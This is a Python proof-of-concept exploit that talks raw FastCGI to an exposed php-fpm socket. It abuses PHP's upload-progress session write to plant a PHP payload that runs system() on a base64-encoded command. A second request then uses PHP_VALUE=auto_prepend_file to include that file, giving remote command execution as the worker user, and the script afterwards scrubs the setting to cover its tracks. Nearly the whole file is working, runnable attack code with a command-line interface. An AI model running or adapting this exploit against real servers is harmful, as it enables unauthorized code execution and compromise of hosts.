#!/usr/bin/env python3
"""FastCGI PHP_VALUE=auto_prepend_file delivery -> RCE.

Corruption-free route spoken as raw FastCGI records at the php-fpm socket (no
HTTP front, no app bug): (a) a slow-dripped multipart POST writes raw PHP into
``sess_<sid>`` via the rfc1867 upload-progress hook; (b) a second request sets
``PHP_VALUE=auto_prepend_file=<sess file>`` so the worker includes it -> RCE as
the pool uid. (b') empties auto_prepend_file to scrub the reused worker.

Lands on vulnerable and patched builds. Preconditions (config/exposure, not
zero-knowledge): reachable fpm socket, a valid SCRIPT_FILENAME, the save_path,
upload_progress on, strict_mode off or an app sid, a multi-worker pool. -I safe.
"""

import os
import re
import socket
import struct
import sys
import threading
import time

# read-only reuse of the house multipart builders (common/ lives under poc/;
# works under `python3 -I` because the script dir is sys.path[0]).
_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from common.multipart import part_tuple as part, multipart_default as multipart  # noqa: E402

# FastCGI framing (FCGI 1.0)
FCGI_VERSION = 1
FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7
FCGI_RESPONDER = 1
FCGI_REQUEST_ID = 1
_MAX_CONTENT = 0xFFFF  # a record's contentLength is a uint16


def fcgi_record(rtype, data=b"", req_id=FCGI_REQUEST_ID):
    """One FastCGI record. Caller keeps each `data` <= 0xFFFF bytes."""
    return struct.pack(">BBHHBx", FCGI_VERSION, rtype, req_id, len(data), 0) + data


def fcgi_nvp(key, value):
    """Encode one FastCGI name-value pair (PARAMS stream)."""
    kb = key.encode() if isinstance(key, str) else key
    vb = value.encode() if isinstance(value, str) else value

    def _len(n):
        if n < 128:
            return bytes([n])
        return bytes([(n >> 24) | 0x80, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])

    return _len(len(kb)) + _len(len(vb)) + kb + vb


def fcgi_parse(data):
    """Split a raw FastCGI response into (type, content) records."""
    out, i = [], 0
    while i + 8 <= len(data):
        rtype = data[i + 1]
        clen = struct.unpack(">H", data[i + 4:i + 6])[0]
        plen = data[i + 6]
        out.append((rtype, data[i + 8:i + 8 + clen]))
        i += 8 + clen + plen
    return out


def fcgi_stdout(records):
    return b"".join(c for t, c in records if t == FCGI_STDOUT)


def fcgi_stderr(records):
    return b"".join(c for t, c in records if t == FCGI_STDERR)


def _begin_request():
    # role RESPONDER, flags 0 -> NO FCGI_KEEP_CONN, so fpm closes the socket
    # after END_REQUEST and our recv loop returns promptly.
    return fcgi_record(FCGI_BEGIN_REQUEST, struct.pack(">HB", FCGI_RESPONDER, 0) + b"\x00" * 5)


def _send_stream(sock, rtype, payload):
    """Send a FastCGI stream (PARAMS/STDIN) chunked under the uint16 limit,
    then its empty terminator record."""
    view = memoryview(payload)
    while view:
        sock.sendall(fcgi_record(rtype, bytes(view[:_MAX_CONTENT])))
        view = view[_MAX_CONTENT:]
    sock.sendall(fcgi_record(rtype, b""))


def _base_params(script, method="GET", ctype="application/x-www-form-urlencoded",
                 clen=0, extra=None):
    params = {
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": script,
        "REQUEST_METHOD": method,
        "CONTENT_TYPE": ctype,
        "CONTENT_LENGTH": str(clen),
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "HTTP_HOST": "localhost",
        "QUERY_STRING": "",
    }
    if extra:
        params.update(extra)
    return params


def fcgi_request(host, port, params, stdin=b"", timeout=15):
    """Send one complete FastCGI request and return its raw stdout bytes."""
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(_begin_request())
        _send_stream(s, FCGI_PARAMS, b"".join(fcgi_nvp(k, v) for k, v in params.items()))
        _send_stream(s, FCGI_STDIN, stdin)
        buf = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except (socket.timeout, OSError):
            pass
    return fcgi_stdout(fcgi_parse(buf))


# (a) upload-progress WRITE  +  (b) auto_prepend DELIVERY
MARK_S, MARK_E = "P2Sb3g1n", "P2Se4nd"

# stock-default save_path guesses (order matters: cheapest/most common first)
SAVE_PATHS = [
    "/tmp/sess", "/var/lib/php/sessions", "/var/lib/php", "/tmp",
    "/var/tmp", "/var/cpanel/php/sessions", "/opt/php/sessions",
]


def make_prepend_key(cmd):
    """The poisoned PHP_SESSION_UPLOAD_PROGRESS field VALUE: raw PHP wrapped in
    unique markers. The leading 'x' keeps the upload_progress_ prefix + our
    text outside the PHP tag (echoed as literal noise)."""
    import base64
    b64 = base64.b64encode(cmd.encode()).decode()
    return (f"x<?php echo '{MARK_S}';"
            f"system(base64_decode('{b64}'));"
            f"echo '{MARK_E}';?>")


def build_upload_body(sid, key, filler=512 * 1024):
    """Multipart body (house helpers) = PHPSESSID + poisoned progress field +
    one large file part. Returns (body_bytes, content_type_header_value)."""
    body, headers = multipart([
        part("PHPSESSID", sid),
        part(p2s_progress_name(), key),
        part("file", b"X" * filler, filename="d.bin",
                 ctype="application/octet-stream"),
    ])
    return body, headers["Content-Type"]


def p2s_progress_name():
    # session.upload_progress.name default
    return "PHP_SESSION_UPLOAD_PROGRESS"


def mint_sid():
    return "p2s" + os.urandom(15).hex()[:29]


def _drip(host, port, script, sid, body, ctype, chunk, delay, stop):
    """Thread target: stream the multipart body slowly over FCGI stdin so the
    poisoned session file stays on disk for the delivery race window."""
    try:
        with socket.create_connection((host, port), timeout=60) as s:
            params = _base_params(script, method="POST", ctype=ctype,
                                  clen=len(body),
                                  extra={"HTTP_COOKIE": f"PHPSESSID={sid}"})
            s.sendall(_begin_request())
            _send_stream(s, FCGI_PARAMS,
                         b"".join(fcgi_nvp(k, v) for k, v in params.items()))
            view = memoryview(body)
            while view and not stop.is_set():
                s.sendall(fcgi_record(FCGI_STDIN, bytes(view[:chunk])))
                view = view[chunk:]
                time.sleep(delay)
            # leave the stream unterminated on stop so the upload never
            # "completes" (completion triggers cleanup of the progress entry).
            if not stop.is_set():
                s.sendall(fcgi_record(FCGI_STDIN, b""))
                try:
                    s.recv(65536)
                except OSError:
                    pass
    except OSError:
        pass


def deliver(host, port, script, sess_file, timeout=5):
    """One delivery request: PHP_VALUE=auto_prepend_file=<sess_file>."""
    params = _base_params(script, extra={
        "PHP_VALUE": f"auto_prepend_file={sess_file}",
        "HTTP_COOKIE": "",
    })
    return fcgi_request(host, port, params, timeout=timeout)


def scrub(host, port, script, n=8):
    """Reset the sticky per-worker auto_prepend_file ini to empty."""
    for _ in range(n):
        try:
            fcgi_request(host, port,
                         _base_params(script, extra={"PHP_VALUE": "auto_prepend_file="}),
                         timeout=3)
        except OSError:
            pass


def extract(stdout):
    m = re.search(MARK_S.encode() + rb"(.*?)" + MARK_E.encode(), stdout, re.S)
    return m.group(1).decode(errors="replace") if m else None


def run(host, port, cmd, script, save_paths=None, sid=None,
        filler=512 * 1024, chunk=256, delay=0.012, headstart=1.0,
        window=40.0, deliver_timeout=5.0, verbose=True):
    """Full WRITE->DELIVER->SCRUB. Returns (ok, output, sess_file).

    `script` is a known SCRIPT_FILENAME (an existing .php under the docroot).
    `save_paths` defaults to SAVE_PATHS; pass a single-element list if known.
    """
    save_paths = save_paths or SAVE_PATHS
    sid = sid or mint_sid()
    key = make_prepend_key(cmd)
    body, ctype = build_upload_body(sid, key, filler=filler)
    sess_files = [f"{sp.rstrip('/')}/sess_{sid}" for sp in save_paths]

    def log(m):
        if verbose:
            print(m, flush=True)

    log(f"[*] target fpm {host}:{port}  script={script}")
    log(f"[*] sid={sid}  save_path guesses={len(sess_files)}")

    stop = threading.Event()
    th = threading.Thread(target=_drip,
                          args=(host, port, script, sid, body, ctype, chunk, delay, stop),
                          daemon=True)
    th.start()
    time.sleep(headstart)

    ok, output, hit = False, None, None
    deadline = time.time() + window
    try:
        while time.time() < deadline and not ok:
            for sf in sess_files:
                if time.time() >= deadline:
                    break
                try:
                    out = deliver(host, port, script, sf, timeout=deliver_timeout)
                except OSError:
                    continue
                got = extract(out)
                if got is not None or MARK_S.encode() in out:
                    ok, output, hit = True, (got or ""), sf
                    break
            if not ok:
                time.sleep(0.1)
    finally:
        stop.set()

    if ok:
        log(f"[+] LANDED via auto_prepend {hit}")
        if output:
            log(output.rstrip())
        scrub(host, port, script)
        log("[*] scrubbed sticky PHP_VALUE (empty auto_prepend_file)")
    else:
        log("[-] no markers in the race window. check: fpm reachable, script "
            "path, save_path, upload_progress.enabled, >=2 workers")
        scrub(host, port, script)
    return ok, output, hit


def _cli(argv):
    import argparse
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host", help="fpm host (e.g. 127.0.0.1)")
    ap.add_argument("port", type=int, help="fpm tcp port (e.g. 9000)")
    ap.add_argument("--script", required=True,
                    help="SCRIPT_FILENAME on target (e.g. /var/www/html/index.php)")
    ap.add_argument("--cmd", default="id", help="shell command to run (default: id)")
    ap.add_argument("--save-path", action="append",
                    help="session save_path (repeatable; default: common guesses)")
    ap.add_argument("--sid", help="session id (default: minted; needs strict_mode=Off)")
    ap.add_argument("--filler", type=int, default=512 * 1024)
    ap.add_argument("--chunk", type=int, default=256)
    ap.add_argument("--delay", type=float, default=0.012)
    ap.add_argument("--window", type=float, default=40.0)
    args = ap.parse_args(argv)
    ok, _out, _sf = run(args.host, args.port, args.cmd, args.script,
                        save_paths=args.save_path, sid=args.sid,
                        filler=args.filler, chunk=args.chunk, delay=args.delay,
                        window=args.window)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
